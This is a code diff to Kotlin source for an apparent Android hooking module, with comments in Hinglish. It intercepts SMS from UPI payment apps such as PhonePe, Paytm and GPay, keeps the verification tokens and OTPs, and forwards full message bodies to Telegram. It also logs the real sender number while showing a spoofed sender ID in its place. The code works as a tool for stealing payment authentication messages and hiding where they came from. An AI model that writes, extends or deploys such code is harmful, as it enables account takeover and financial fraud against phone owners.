@@ -12,7 +12,6 @@ object SmsMatcher {
     fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
         UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }
 
-    /** Jo user MESSAGE tab me dale — bilkul wahi, bina change kiye */
     fun userSenderId(config: ModuleConfig): String? {
         val id = config.injectSenderId.trim()
         if (id.isBlank()) return null
@@ -20,33 +19,34 @@ object SmsMatcher {
         return id
     }
 
+    fun matchedHookedApp(config: ModuleConfig, peer: String, body: String): UpiAppRegistry.UpiApp? {
+        val hooked = enabledHookedApps(config)
+        if (hooked.isEmpty()) return null
+        return UpiAppRegistry.matchAmong(hooked, peer, body)
+    }
+
     fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
         if (!config.hookIncomingSms && !config.hookUpiVerification) return false
-        return shouldCaptureForHookedApps(config, sender, body)
+        return shouldInterceptHookedUpi(config, sender, body)
     }
 
     fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
         if (!config.hookOutgoingSms) return false
-        return shouldCaptureForHookedApps(config, recipient, body)
+        return shouldInterceptHookedUpi(config, recipient, body)
     }
 
-    private fun shouldCaptureForHookedApps(config: ModuleConfig, peer: String, body: String): Boolean {
+    /** Sirf hooked UPI app ka SMS/token — normal personal SMS / random OTP nahi */
+    fun shouldInterceptHookedUpi(config: ModuleConfig, peer: String, body: String): Boolean {
         if (body.isBlank() || peer.isBlank()) return false
-        val hooked = enabledHookedApps(config)
-        if (hooked.isEmpty()) return false
-
-        val customId = userSenderId(config)
-
-        // Dusre phone se OTP — intercept (display = tumhara Sender ID, number nahi)
-        if (customId != null && isOtpLike(body)) return true
-
-        if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
-        if (isVerificationBody(body) && UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true
-
-        return false
+        return matchedHookedApp(config, peer, body) != null && isUpiVerificationContent(body)
     }
 
-    /** Telegram intercept — kabhi dusre phone / real number mat dikhao */
+    /** Telegram pe sirf hooked UPI app verification token / OTP */
+    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String): Boolean {
+        if (!config.autoForwardToken) return false
+        return shouldInterceptHookedUpi(config, peer, body)
+    }
+
     fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
         userSenderId(config)?.let { return it }
         if (isCarrierSenderId(actualPeer)) return actualPeer.trim()
@@ -66,10 +66,12 @@ object SmsMatcher {
         return digits.length >= 8 && !sender.any { it.isLetter() }
     }
 
+    /** Telegram / local — poora SMS body dikhao, sirf OTP digits mat kaato agar UPI verification hai */
     fun extractToken(body: String, autoExtract: Boolean): String {
         val trimmed = body.trim()
         if (trimmed.isEmpty()) return ""
         if (isEncryptedToken(trimmed)) return trimmed
+        if (isUpiVerificationContent(trimmed)) return trimmed
         if (!autoExtract) return trimmed
 
         val matcher = OTP_PATTERN.matcher(trimmed)
@@ -89,18 +91,14 @@ object SmsMatcher {
         return tokenChars >= compact.length * 0.85
     }
 
-    private fun isOtpLike(body: String): Boolean {
-        if (isVerificationBody(body)) return true
-        val trimmed = body.trim()
-        if (trimmed.length in 4..8 && trimmed.all { it.isDigit() }) return true
-        return OTP_PATTERN.matcher(trimmed).find()
-    }
-
-    private fun isVerificationBody(body: String): Boolean {
+    private fun isUpiVerificationContent(body: String): Boolean {
         if (isEncryptedToken(body)) return true
-        val upper = body.uppercase()
+        val trimmed = body.trim()
+        if (trimmed.length <= 3) return false
+        val upper = trimmed.uppercase()
         val keywords = listOf(
-            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "CODE", "PIN", "PASSWORD", "BANK"
+            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO",
+            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "BANK", "PAY"
         )
         return keywords.any { upper.contains(it) }
     }
@@ -115,6 +113,7 @@ object OtpCaptureWriter {
             put("body", otp.body)
             put("direction", otp.direction)
             put("phone", otp.phone)
+            put("raw_peer", otp.rawPeer)
             put("message_label", otp.messageLabel)
             put("captured_at", System.currentTimeMillis())
         }
